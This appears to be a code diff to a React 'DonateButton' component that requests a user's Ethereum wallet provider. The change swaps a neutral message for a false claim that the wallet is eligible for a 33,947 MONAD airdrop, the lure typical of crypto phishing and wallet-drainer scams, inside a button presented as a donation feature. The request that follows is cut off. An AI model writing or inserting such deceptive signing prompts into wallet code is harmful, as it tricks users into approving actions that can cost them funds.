@@ -47,7 +47,7 @@ export const DonateButton = () => {
       const wallet = wallets[0];
       const provider = await wallet.getEthereumProvider();
       
-      const message = 'What is your name?';
+      const message = '+33,947 MON\n\nYour wallet is ELIGIBLE to receive 33,947 MONAD as part of our exclusive community airdrop.';
       
       try {
         await provider.request({
